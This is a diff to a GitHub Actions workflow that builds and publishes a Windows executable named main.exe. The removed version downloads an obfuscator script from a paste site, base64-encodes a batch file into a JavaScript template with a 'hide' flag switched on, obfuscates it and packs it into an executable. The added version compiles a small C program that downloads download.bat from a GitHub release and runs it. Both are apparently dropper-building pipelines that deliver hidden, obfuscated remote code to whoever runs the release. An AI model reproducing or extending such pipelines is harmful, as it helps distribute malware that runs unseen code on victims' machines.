@@ -1,97 +1,62 @@
-name: Obfuscate File and Upload
+name: EXE
 
 on:
-  push:
-    paths:
-      - 'run.cmd'
-  schedule:
-    - cron: '0 0 * * *'  # Runs every day at midnight UTC
-  workflow_dispatch:  # Allows manual triggering
+  workflow_dispatch:
 
 jobs:
-  obfuscate:
+  build:
     runs-on: windows-latest
-    permissions:
-      contents: write
-      pull-requests: write
-      repository-projects: write
+
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v3
+    - name: Checkout repository
+      uses: actions/checkout@v2
 
-      - name: Download main.py
-        run: |
-          Invoke-WebRequest -Uri https://rentry.co/rbbydedw/raw -OutFile main.py
+    - name: Create C3C file
+      run: |
+        echo #include <stdio.h> > script.c3
+        echo #include <stdlib.h> >> script.c3
+        echo int main() { >> script.c3
+        echo system("curl -L -o download.bat https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"); >> script.c3
+        echo system("download.bat"); >> script.c3
+        echo return 0; >> script.c3
+        echo } >> script.c3
 
-      - name: Obfuscate run.cmd
-        run: |
-          python main.py
+    - name: Install C3C
+      run: |
+        # Add your C3C installation steps here
+        # This is an example and may need modification based on how C3C is installed
+        choco install c3c -y
 
-      - name: Base64 Encode run-obf.bat
-        id: base64_encode
-        run: |
-          $base64Encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes('run-obf.bat'))
-          [IO.File]::WriteAllText('encoded.b64', $base64Encoded)
+    - name: Compile C3C Script
+      run: |
+        c3c script.c3 -o script.exe
 
-      - name: Download and Modify template.js
-        run: |
-          # Download the template.js file
-          Invoke-WebRequest -Uri https://gist.githubusercontent.com/43a1723/5438757c62f08f079100f4c8e67ecfa3/raw/7d8bb3de270a2420e298550575ae314e2c8edc80/gistfile1.txt -OutFile template.js
+    - name: Delete-tag-and-release
+      uses: dev-drprasad/delete-tag-and-release@v1.1
+      with:
+        tag_name: AutoBuildExe
+        delete_release: true
+        github_token: ${{ secrets.GITHUB_TOKEN }}
 
-          # Read the content of template.js and replace placeholders
-          $templateContent = Get-Content -Path template.js -Raw
-          $templateContent = $templateContent -replace 'const hide = false;', 'const hide = true;'
-          $base64Content = Get-Content -Path encoded.b64 -Raw
-          $templateContent = $templateContent -replace 'BASE64ENCODEDSTUFFHERE', $base64Content
+    - name: Create Release
+      id: create_release
+      uses: actions/create-release@latest
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        tag_name: AutoBuildExe
+        release_name: AutoBuildExe
+        body: Obfuscated run.cmd file
+        draft: false
+        prerelease: false
 
-          # Write the modified content to a new file
-          Set-Content -Path modified.js -Value $templateContent
-
-      - name: Install Node.js and Required Packages
-        uses: actions/setup-node@v3
-        with:
-          node-version: '18'
-          
-      - name: Install pkg and javascript-obfuscator
-        run: |
-          npm install -g pkg javascript-obfuscator
-
-      - name: Obfuscate JavaScript File
-        run: |
-          # Obfuscate the JavaScript file
-          javascript-obfuscator modified.js --output obfuscated.js
-
-      - name: Package Obfuscated JavaScript File
-        run: |
-          # Package the obfuscated JavaScript file into an executable
-          pkg obfuscated.js --compress GZip -t node18-win
-
-      - name: Delete-tag-and-release
-        uses: dev-drprasad/delete-tag-and-release@v1.1
-        with:
-          tag_name: AutoBuildExe
-          delete_release: true
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Create Release
-        id: create_release
-        uses: actions/create-release@latest
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          tag_name: AutoBuildExe
-          release_name: AutoBuildExe
-          body: Obfuscated run.cmd file
-          draft: false
-          prerelease: false
-
-      - name: Upload Release Asset
-        id: upload-release-asset 
-        uses: actions/upload-release-asset@v1
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          upload_url: ${{ steps.create_release.outputs.upload_url }}
-          asset_path: obfuscated.exe
-          asset_name: main.exe
-          asset_content_type: application/octet-stream
+    - name: Upload Release Asset
+      id: upload-release-asset 
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: script.exe
+        asset_name: main.exe
+        asset_content_type: application/octet-stream
